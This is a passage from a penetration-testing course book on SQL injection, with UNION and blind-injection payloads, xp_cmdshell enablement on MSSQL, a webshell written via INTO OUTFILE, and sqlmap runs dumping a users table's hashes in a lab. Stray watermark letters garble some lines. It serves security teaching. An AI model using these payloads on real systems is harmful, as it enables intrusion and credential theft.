Made in Morocco
Penetration Testing with Kali Linux
Figure 159: Dumping the Current Database Tables Structure
This output verifies that the three columns contain the table namey, the column name, and the
current database, respectively.
k
Interestingly, we discovered a new table named users that contains four columns, including one
named password.
s
Let’s craft a new query to dump the users table.
o
' UNION SELECT null, username, password, description, null FROM users -- //
Listing 200 - Retrieving Current Database Tables and Columns
n
Using the above statement, we’ll again attempt to store the output of the username, password,
and description in the web application table.
i
z
D
Figure 160: Dumping Users Credentials
Great! Our UNION-based payload was able to fetch the usernames and MD5 hashes of the entire
users table, including an administrative account. These MD5462 values are encrypted versions of
the plain-text passwords, which can be reversed using appropriate tools.
10.2.3 Blind SQL Injections
The SQLi payloads we have encountered are in-band, meaning we’re able to retrieve the database
content of our query inside the web application.
Alternatively, blind SQL injections describe scenarios in which database responses are never
returned and behavior is inferred using either boolean- or time-based logic.
462 (Wikipedia, 2022), https://en.wikipedia.org/wiki/MD5
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 304
Made in Morocco
Penetration Testing with Kali Linux
As an example, generic boolean-based blind SQL injections cause the application to return
different and predictable values whenever the database query returns a TRUE or FALSE result,
hence the “boolean” name. These values can be reviewed within the application context.
Although “boolean-based” might not seem like a blind SQLi variant, the output
used to infer results comes from the web application, not the database itself.
Time-based blind SQL injections infer the query results by instructing the database to wait for a
specified amount of time. Based on the response time, the attacker is able to conclude if the
statement is TRUE or FALSE.
Our vulnerable application (http://192.168.50.16/blindsqli.php) includes a code portion affected
y
by both types of blind SQL injection vulnerabilities.
Once we have logged in with the offsec and lab credentials, wek’ll encounter the following page:
s
o
n
i
z
D
Figure 161: Testing for Blind SQLi
Closely reviewing the URL, we’ll notice that the application takes a user parameter as input,
defaulting to offsec since this is our current logged-in user. The application then queries the
user’s record, returning the Username, Password Hash, and Description values.
To test for boolean-based SQLi, we can try to append the below payload to the URL:
http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 305
Made in Morocco
Penetration Testing with Kali Linux
Listing 201 - Testing for boolean-based SQLi
Since 1=1 will always be TRUE, the application will return the values only if the user is present in
the database. Using this syntax, we could enumerate the entire database for other usernames or
even extend our SQL query to verify data in other tables.
We can achieve the same result by using a time-based SQLi payload:
http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
Listing 202 - Testing for time-based SQLi
In this case, we appended an IF condition that will always be true inside the statement itself, but
will return false if the user is non-existent.
We know the user offsec is active, so we if paste the above URL payload in our Kali VM’s browser,
we’ll notice that the application hangs for about three seconds. y
This attack angle can clearly become very time consuming, so it’s often automated with tools like
k
sqlmap, as we’ll cover in the next Learning Unit.
10.3 Manual and Automated Code Exescution
This Learning Unit covers the following Learning Objectives:
o
• Exploit MSSQL Databases with xp_cmdshell
n
• Automate SQL Injection with SQLmap
Depending on the operating system, service privileges, and filesystem permissions, SQL injection
i
vulnerabilities can be used to read and write files on the underlying operating system. Writing a
z
carefully crafted file containing PHP code into the root directory of the web server could then be
leveraged for full code execution.
D
10.3.1 Manual Code Execution
Depending on the underlying database system we are targeting, we need to adapt our strategy to
obtain code execution.
In Microsoft SQL Server, the xp_cmdshell463 function takes a string and passes it to a command
shell for execution. The function returns any output as rows of text. The function is disabled by
default and, once enabled, it must be called with the EXECUTE keyword instead of SELECT.
In our database, the Administrator user already has the appropriate permissions. Let’s enable
xp_cmdshell by simulating a SQL injection via the impacket-mssqlclient tool.
kali@kali:~$ impacket-mssqlclient Administrator:PI:EMAIL -windows-auth
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
...
SQL> EXECUTE sp_configure 'show advanced options', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options'
changed from 0 to 1. Run the RECONFIGURE statement to install.
463 (Microsoft, 2022), https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-
sql?view=sql-server-ver15
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 306
Made in Morocco
Penetration Testing with Kali Linux
SQL> RECONFIGURE;
SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from
0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
Listing 203 - Enabling xp_cmdshell feature
After logging in from our Kali VM to the MSSQL instance, we can enable show advanced options
by setting its value to 1, then applying the changes to the running configuration via the
RECONFIGURE statement. Next, we’ll enable xp_cmdshell and apply the configuration again using
RECONFIGURE.
With this feature enabled, we can execute any Windows shell command through the EXECUTE
statement followed by the feature name.
SQL> EXECUTE xp_cmdshell 'whoami'; y
output
k
--------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------
--------------------------------------------------s---------------------------------
nt service\mssql$sqlexpress
o
NULL
Listing 204 - Executing Commands via xp_cmdshell
n
Since we have full control over the system, we can now easily upgrade our SQL shell to a more
standard reverse shell.
i
z
Although the various MySQL database variants don’t offer a single function to escalate to RCE, we
can abuse the SELECT INTO_OUTFILE464 statement to write files on the web server.
D
For this attack to work, the file location must be writable to the OS user running
the database software.
As an example, let’s resume the UNION payload on our MySQL target application we explored
previously, expanding the query that writes a webshell465 on disk.
We’ll issue the UNION SELECT SQL keywords to include a single PHP line into the first column
and save it as webshell.php in a writable web folder.
' UNION SELECT "", null, null, null, null INTO OUTFILE
"/var/www/html/tmp/webshell.php" -- //
Listing 205 - Write a WebShell To Disk via INTO OUTFILE directive
The written PHP code file results in the following:
464 (Oracle, 2022), https://dev.mysql.com/doc/refman/8.0/en/select-into.html
465 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Web_shell
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 307
Made in Morocco
Penetration Testing with Kali Linux
Listing 206 - PHP reverse shell
The PHP system function will parse any statement included in the cmd parameter coming from
the client HTTP REQUEST, thus acting like a web-interactive command shell.
If we try to use the above payload inside the Lookup field of the search.php endpoint, we receive
the following error:
y
k
s
o
n
Figure 162: Writing the WebShell to Disk
Fortunately, this error is related to ithe incorrect return type, and should not impact writing the
webshell on disk. z
To confirm, we can access the newly created webshell inside the tmp folder along with the id
D
command.
Figure 163: Accessing the Webshell
Great! The webshell is working as expected, since the output of the id command is returned to us
through the web browser. We discovered that we are executing commands as the www-data
user, an identity commonly associated with web servers on Linux systems.
Now that we understand how to leverage SQLi to manually obtain command execution, let’s
discover how to automate the process with specific tools.
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 308
Made in Morocco
Penetration Testing with Kali Linux
10.3.2 Automating the Attack
The SQL injection process we followed can be automated using several tools pre-installed on Kali
Linux. In particular, sqlmap466 can identify and exploit SQL injection vulnerabilities against various
database engines.
Let’s run sqlmap on our sample web application. We will set the URL we want to scan with -u and
specify the parameter to test using -p:
kali@kali:~$ sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user
___
__H__
___ ___[,]_____ ___ ___ {1.6.4#stable}
|_ -| . [)] | .'| . |
|___|_ [,]_|_|_|__,| _|
y
|_|V... |_| https://sqlmap.org
... k
[*] starting @ 02:14:54 PM /2022-05-16/
[14:14:54] [INFO] resuming back-end DBMS 'mysql' s
[14:14:54] [INFO] testing connection to the target URL
got a 302 redirect to 'http://192.168.50.16:80/login1.php?msg=2'. Do you want to
o
follow? [Y/n]
you have not declared cookie(s), while server wants to set its own
('PHPSESSID=fbf1f5fa5fc...a7266cba36'). Do you want to use those [Y/n]
n
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: user (GET) i
Type: time-based blind
z
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: user=1' AND (SELECT 1582 FROM (SELECT(SLEEP(5)))dTzB) AND 'hiPB'='hiPB
--- D
[14:14:57] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: PHP, PHP 7.3.33, Apache 2.4.52
back-end DBMS: MySQL >= 5.0.12
[14:14:57] [INFO] fetched data logged to text files under
'/home/kali/.local/share/sqlmap/output/192.168.50.16'
[*] ending @ 02:14:57 PM /2022-05-16/
Listing 207 - Running sqlmap to quickly find SQL injection points
I
We submitted the entire URL after the -u specifier together with the ?user parameter set to a
dummy value. Once launched, we can press on the default options. Sqlmap then returns
confirmation that we are dealing with a time-based blind SQL injection and provides additional
fingerprinting information such as the web server operating system, web application technology
stack, and the backend database.
Although the above command confirmed that the target URL is vulnerable to SQLi, we can extend
our tradecraft by using sqlmap to dump the database table and steal user credentials.
466 (sqlmap, 2022), http://sqlmap.org/
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 309
Made in Morocco
Penetration Testing with Kali Linux
Although sqlmap is a great tool to automate SQLi attacks, it provides next-to-
zero stealth. Due to its high-volume of traffic, sqlmap should not be used as a
first choice tool during assignments that require staying under the radar.
To dump the entire database, including user credentials, we can run the same command as
earlier with the --dump parameter.
kali@kali:~$ sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump
...
[*] starting @ 02:23:49 PM /2022-05-16/
[14:23:49] [INFO] resuming back-end DBMS 'mysql' y
[14:23:49] [INFO] testing connection to the target URL
got a 302 redirect to 'http://192.168.50.16:80/login1.php?msg=2'. Do you want to
follow? [Y/n] k
you have not declared cookie(s), while server wants to set its own
('PHPSESSID=b7c9c962b85...c6c7205dd1'). Do you want to use those [Y/n]
s
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: user (GET) o
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: user=1' AND (SELECT 1582 FnROM (SELECT(SLEEP(5)))dTzB) AND 'hiPB'='hiPB
---
[14:23:52] [INFO] the back-end DBMS is MySQL
web server operating system: Liniux Debian
web application technology: PHzP, Apache 2.4.52, PHP 7.3.33
back-end DBMS: MySQL >= 5.0.12
[14:23:52] [WARNING] missing database parameter. sqlmap is going to use the current
D
database to enumerate table(s) entries
[14:23:52] [INFO] fetching current database
[02:23:52 PM] [WARNING] time-based comparison requires larger statistical model,
please wait.............................. (done)
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--
time-sec')? [Y/n]
[14:25:26] [WARNING] it is very important to not stress the network connection during
usage of time-based payloads to prevent potential disruptions
[14:25:26] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry
the request(s)
[14:25:47] [INFO] adjusting time delay to 2 seconds due to good response times
offsec
[14:27:01] [INFO] fetching tables for database: 'offsec'
[14:27:01] [INFO] fetching number of tables for database 'offsec'
[02:27:01 PM] [INFO] retrieved: 2
[02:27:11 PM] [INFO] retrieved: customers
[02:29:25 PM] [INFO] retrieved: users
[14:30:38] [INFO] fetching columns for table 'users' in database 'offsec'
[02:30:38 PM] [INFO] retrieved: 4
[02:30:44 PM] [INFO] retrieved: id
[02:31:14 PM] [INFO] retrieved: username
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 310
Made in Morocco
Penetration Testing with Kali Linux
[02:33:02 PM] [INFO] retrieved: password
[02:35:09 PM] [INFO] retrieved: description
[14:37:56] [INFO] fetching entries for table 'users' in database 'offsec'
[14:37:56] [INFO] fetching number of entries for table 'users' in database 'offsec'
[02:37:56 PM] [INFO] retrieved: 4
[02:38:02 PM] [WARNING] (case) time-based comparison requires reset of statistical
model, please wait.............................. (done)
[14:38:24] [INFO] adjusting time delay to 1 second due to good response times
this is the admin
[02:40:54 PM] [INFO] retrieved: 1
[02:41:02 PM] [INFO] retrieved: 21232f297a57a5a743894a0e4a801fc3
[02:46:34 PM] [INFO] retrieved: admin
[02:47:15 PM] [INFO] retrieved: try harder
[02:48:44 PM] [INFO] retrieved: 2
[02:48:54 PM] [INFO] retrieved: f9664ea1803311b35f
y
...
Listing 208 - Running sqlmap to Dump Users Credentials Table